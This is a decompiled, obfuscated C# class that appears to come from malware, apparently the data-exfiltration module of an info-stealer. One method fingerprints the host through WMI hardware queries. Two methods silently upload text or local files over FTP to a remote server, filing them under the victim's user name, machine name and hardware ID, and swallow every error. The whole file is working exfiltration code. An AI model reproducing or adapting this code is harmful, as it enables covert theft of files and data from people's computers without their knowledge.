using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace Complex;

internal sealed class UtilMe
{
	[NonSerialized]
	internal static GetString getString_0;

	public static string UniqID()
	{
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_003a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0040: Expected O, but got Unknown
		//IL_00a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		string text = string.Empty;
		ManagementClass val = new ManagementClass(getString_0(107404781));
		ManagementObjectCollection instances = val.GetInstances();
		ManagementObjectEnumerator enumerator = instances.GetEnumerator();
		try
		{
			if (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				text = ((ManagementBaseObject)val2).get_Properties().get_Item(getString_0(107404760)).get_Value()
					.ToString();
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
		string text2 = getString_0(107404775);
		ManagementObject val3 = new ManagementObject(getString_0(107404770) + text2 + getString_0(107404185));
		val3.Get();
		string text3 = ((ManagementBaseObject)val3).get_Item(getString_0(107404180)).ToString();
		return text3 + text;
	}

	public static void Send(string FTPAddress = "URL", string ftpUsername = "USERNAME", string ftpPassword = "ACCESO", string InfData = "")
	{
		try
		{
			string text = UniqID();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(FTPAddress + getString_0(107407128) + Environment.UserName + getString_0(107407147) + Environment.MachineName + getString_0(107407094) + text + getString_0(107407089));
			ftpWebRequest.Method = getString_0(107404155);
			ftpWebRequest.Credentials = new NetworkCredential(ftpUsername, ftpPassword);
			ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
			byte[] bytes = aSCIIEncoding.GetBytes(InfData);
			ftpWebRequest.ContentLength = bytes.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(bytes, 0, bytes.Length);
		}
		catch
		{
		}
	}

	public static void SendB(string FTPAddress = "URL", string ftpUsername = "USERNAME", string ftpPassword = "ACCESO", string localFilePath = "")
	{
		try
		{
			string text = UniqID();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(FTPAddress + getString_0(107407128) + Environment.UserName + getString_0(107407147) + Environment.MachineName + getString_0(107407094) + text + getString_0(107407094) + Path.GetFileName(localFilePath));
			ftpWebRequest.Method = getString_0(107404155);
			ftpWebRequest.Credentials = new NetworkCredential(ftpUsername, ftpPassword);
			byte[] array = File.ReadAllBytes(localFilePath);
			ftpWebRequest.ContentLength = array.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(array, 0, array.Length);
		}
		catch
		{
		}
	}

	static UtilMe()
	{
		Strings.CreateGetStringDelegate(typeof(UtilMe));
	}
}
